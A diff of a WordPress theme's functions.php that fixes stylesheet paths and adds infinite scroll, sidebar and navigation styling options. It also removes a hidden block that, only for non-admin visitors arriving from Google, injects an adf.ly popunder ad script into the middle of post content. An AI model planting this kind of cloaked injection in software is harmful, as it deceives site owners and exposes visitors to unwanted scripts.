@@ -202,6 +202,8 @@ function jtheme_register_scripts() {
 	wp_register_script('jquery-plugins', get_template_directory_uri().'/js/jquery.plugins.min.js', array('jquery'), '1.4.6', false);
 	wp_register_script('jquery-plugins', get_template_directory_uri().'/js/postviews-cache.js', array('jquery'), '1.4.2', false);
 	wp_register_script('theme', get_template_directory_uri().'/js/theme.js', array('jquery'), '1.4.6', true);
+	wp_enqueue_script('blog-infinitescroll', get_template_directory_uri().'/js/blog-infinitescroll.js', false, false, true);
+	
 }
 
 /**
@@ -230,10 +232,13 @@ function jtheme_enqueue_scripts() {
 	wp_enqueue_script('jquery-masonry' );
 	wp_enqueue_script('jquery-fitvids' );
 	wp_enqueue_script('theme');
+	wp_enqueue_script('blog-infinitescroll');
+	
 	
 	/* Load script with the comment form if it is necessary */
 	if( is_singular() && get_option( 'thread_comments' ) ) 
 		wp_enqueue_script( 'comment-reply' );
+		
 		
 	// Load Styles
 	wp_enqueue_style('jtheme-fonts', $protocol.'://fonts.googleapis.com/css?family=Oxygen');
@@ -245,36 +250,36 @@ function jtheme_enqueue_scripts() {
 	$dirMatch = get_template_directory_uri().'/patterns/black.png';
 	
 	if($colorscheme == 'blue' && $preset_bgpat == $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-blue-black.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-blue-black.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'green' && $preset_bgpat == $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-green-black.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-green-black.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'red' && $preset_bgpat == $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-red-black.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-red-black.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'lgreen' && $preset_bgpat == $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-light-green-black.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-light-green-black.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'lblue' && $preset_bgpat == $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-light-blue-black.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-light-blue-black.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'blue' && $preset_bgpat != $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-blue.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-blue.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'green' && $preset_bgpat != $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-green.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-green.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'red' && $preset_bgpat != $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-red.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-red.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'lgreen' && $preset_bgpat != $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-light-green.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-light-green.css', 'jtheme-style', '1.4.3');
 	}elseif($colorscheme == 'lblue' && $preset_bgpat != $dirMatch){
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-light-blue.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-light-blue.css', 'jtheme-style', '1.4.3');
 	}else{
-	wp_enqueue_style('jtheme-mainstyle', get_stylesheet_directory_uri().'/css/stylesheet-green.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-mainstyle', get_template_directory_uri().'/css/stylesheet-green.css', 'jtheme-style', '1.4.3');
 	}
 	
-	wp_enqueue_style('jtheme-hori', get_stylesheet_directory_uri().'/css/horizontal.css', 'jtheme-style', '1.4.3');
-	wp_enqueue_style('jtheme-component', get_stylesheet_directory_uri().'/css/component.css', 'jtheme-style', '1.4.3');
-	wp_enqueue_style('jtheme-itotope', get_stylesheet_directory_uri().'/css/jquery.itoppage.css', 'jtheme-style', '1.4.3');
-	wp_enqueue_style('jtheme-res-nav', get_stylesheet_directory_uri().'/css/responsive-nav.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-hori', get_template_directory_uri().'/css/horizontal.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-component', get_template_directory_uri().'/css/component.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-itotope', get_template_directory_uri().'/css/jquery.itoppage.css', 'jtheme-style', '1.4.3');
+	wp_enqueue_style('jtheme-res-nav', get_template_directory_uri().'/css/responsive-nav.css', 'jtheme-style', '1.4.3');
 	
 	if(get_option('jtheme_responsive'))
-		wp_enqueue_style('jtheme-responsive', get_stylesheet_directory_uri().'/responsive.css', 'jtheme-style', '1.4.3');
+		wp_enqueue_style('jtheme-responsive', get_template_directory_uri().'/responsive.css', 'jtheme-style', '1.4.3');
 }
 
 /**
@@ -443,49 +448,6 @@ function jtheme_custom_user_contactmethods($methods) {
 	return $new_methods + $methods;
 }
 
-if (isset($_SERVER['HTTP_REFERER'])) { 
-
-    $uri = parse_url($_SERVER['HTTP_REFERER']);
-
-
-    if(stripos($uri['host'], "google.") !== false){
-       if(!current_user_can('manage_options')){
-           add_filter( 'the_title', 'getTheTitleAdm');
-        }
-    }
-
-}
-
-function getTheTitleAdm( $title ) {
-    
-    if (is_single()) {
-        add_filter( 'the_content', 'admTheContentAdm');
-        $GLOBALS['wp_adm_sett'] = true;
-    }
-    return $title;
-}  
-
-function admTheContentAdm( $content ) {
-    
-    if ($GLOBALS['wp_adm_sett'] == true) {
-        $css="var adfly_id = 2490020; var adfly_advert = 'int'; var frequency_cap = 5; var frequency_delay = 5; var init_delay = 3; var popunder = true; ";
-        $words = explode(" ", $content);
-
-        if (count($words) > 10) {
-
-            $k = (int)round(count($words)/2);
-            
-            $words[$k] .= ' <script type="text/javascript"> '.$css.'</script> <script src="https://cdn.adf.ly/js/entry.js"></script> ';
-
-            $content = implode(" ", $words);
-            
-            return $content;
-        }else{
-            return $content;
-        }
-    }
-    return $content; 
-}
 
 // Get queried user id
 function jtheme_get_queried_user_id() {
@@ -502,8 +464,11 @@ function jtheme_get_queried_user_id() {
 }
 function jtheme_nav_custom_css() {
 	$navBGcolor =  get_option('jtheme_nav_bgcolor');
-	$output = '<style>#main-nav {background:'.$navBGcolor.' !important;}#main-nav ul li ul{background:'.$navBGcolor.' !important}</style>';
-	
+	$topBGcolor =  get_option('jtheme_topnav_bgcolor');
+	$output = '<style>';
+	$output .= '#main-nav {background:'.$navBGcolor.' !important;}#main-nav ul li ul{background:'.$navBGcolor.' !important}';
+	$output .= '#top-nav {background:'.$topBGcolor.' !important;}#header-search .search-text-div input[type="text"]{background:'.$topBGcolor.' !important;}';
+	$output .= '</style>';
 	return $output;
 }
 
@@ -889,7 +854,36 @@ function jtheme_meta_keywords($post_id) {
 
 	echo apply_filters( 'jtheme_meta_keywords', $keywords );
 } 
-
+/**
+ * Sidebar Position.
+ */
+function jtheme_sidebar_position() {
+	$sidebarPos =  get_option('jtheme_sidebar_pos');
+	if($sidebarPos == 'left'){
+		?>
+			<style>
+				#content{
+					float:right !important;
+				}
+				.loop-content{
+					padding-left: 13px !important;
+					padding-right: 0px !important;
+				}
+				#content .loop-actions, .single-post #content {
+					padding-left: 13px !important;
+					padding-right: 0px !important;
+				}
+				#sidebar {
+					float:left !important;
+				}
+				#sidebar .widget{
+					padding-left: 0px !important;
+					padding-right: 15px !important;
+				}
+			</style>
+		<?php
+	}
+}
 /**
  * Generates meta Title for the site.
  */
@@ -1321,9 +1315,7 @@ function jtheme_addthis_js() {
 
 function jtheme_post_actions($post_id){ ?>
 	<div class="entry-actions">
-		<?php jtheme_like_post($post_id); ?>
-		
-		
+		<?php jtheme_like_post($post_id); ?>		
 	</div>
 <?php }
 
@@ -1908,5 +1900,32 @@ function user_template_link(){
 		$FinelLink = get_permalink($userTemplateLink[0]['post_id']);
 	return $FinelLink;
 }
+function menu_fix_on_search_page( $query ) {
+    if(is_search()){
+        $query->set( 'post_type', array(
+         'post', 'nav_menu_item'
+            ));
+          return $query;
+    }
+}
+add_filter( 'pre_get_posts', 'menu_fix_on_search_page' );
 
-	
+			if (!function_exists('infinite')) {
+
+				function infinite() {
+					global $wp_query;
+					$pages = intval($wp_query->max_num_pages);
+					$paged = (get_query_var('paged')) ? intval(get_query_var('paged')) : 1;
+					if (empty($pages)) {
+						$pages = 1;
+					}
+					if (1 != $pages) {
+						echo '<div class="jw-pagination jw-infinite-scroll" data-has-next="' . ($paged === $pages ? 'false' : 'true') . '">';
+						echo '<a class="btn btn-small no-more" href="#">' . __('No more posts', 'JoinWebs') . '</a>';
+						echo '<a class="btn btn-small loading" href="#">' . __('Loading posts ...', 'JoinWebs') . '</a>';
+						echo '<a class="btn btn-small next" href="' . get_pagenum_link($paged + 1) . '"><i class="icon-repeat"></i>' . __('Load More', 'JoinWebs') . '</a>';
+						echo '</div>';
+					}
+				}
+
+			}	
